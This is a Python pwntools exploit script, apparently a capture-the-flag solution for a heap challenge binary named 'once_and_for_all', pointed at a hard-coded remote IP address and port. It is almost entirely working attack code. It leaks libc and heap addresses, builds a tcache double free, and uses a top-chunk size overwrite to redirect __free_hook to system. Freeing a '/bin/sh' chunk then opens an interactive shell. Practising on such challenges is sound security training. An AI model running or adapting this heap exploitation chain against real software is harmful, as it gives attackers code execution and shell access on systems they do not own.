#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 68.183.37.6 --port 31705 ./once_and_for_all
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./once_and_for_all')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '68.183.37.6'
port = int(args.PORT or 31705)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *main+183
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  './glibc/'

io = start()

def add_small(idx,size,msg):
    io.sendlineafter(">> ","1")
    io.sendlineafter(": ",str(idx))
    io.sendlineafter(": ",str(size))
    io.sendafter(": \n",msg)

def free_small(idx,size=0x20,msg="a",create=False,option=2):
    io.sendlineafter(">> ","2")
    io.sendlineafter(": ",str(idx))
    if create:
        io.sendlineafter(": ",str(size))
        io.sendafter(": \n",msg)
        io.sendlineafter(">> ",str(option))
    else:
    	io.sendlineafter(": ","1")
        
def examine(idx):
    io.sendlineafter(">> ","3")
    io.sendlineafter(": ",str(idx))

def add_big(size):
    io.sendlineafter(">> ","4")
    io.sendlineafter(": ",str(size))

libc = ELF("./libc.so.6")

add_small(0,0x20,"a")
add_small(1,0x20,"b")
add_small(2,0x30,"c")
free_small(0)
free_small(1)
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b": ", b"0"*0x400 )
add_small(3,0x28,"e"*0x28 + "\x33")
free_small(2, 0x20, b"B"*0x8, create=True,option=1)
io.recv(8)
leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))
print("leak:", hex(leak))
libc.address =  leak - 0x3ebca0
print("libc:", hex(libc.address))

add_small(4, 0x20, "A")
add_small(5, 0x20, "B")
add_small(6, 0x20, (p64(0) + p64(0x31))*2 )
free_small(4)
free_small(5)
free_small(4)
examine(4)

heap_base = u64(io.recvline()[:-1].ljust(8, b'\x00')) & ~0xfff
print("heap_base:", hex(heap_base))

add_small(7, 0x20, p64(heap_base + 0x680))
add_small(8, 0x20, "/bin/sh\x00")
add_small(9, 0x20, "JUNK" )
add_small(10, 0x20, p64(0)+p64(0xffffffffffffffff) )

offset = libc.symbols["__free_hook"] - (heap_base+0x690) -0x40
print(hex(offset))

add_big(offset)
add_small(11, 0x38, "JUNK")
add_small(12, 0x38, p64(0)*5 + p64(libc.symbols["system"]))

io.sendlineafter("> ", "2")
io.sendlineafter(": ", "8")

io.interactive()

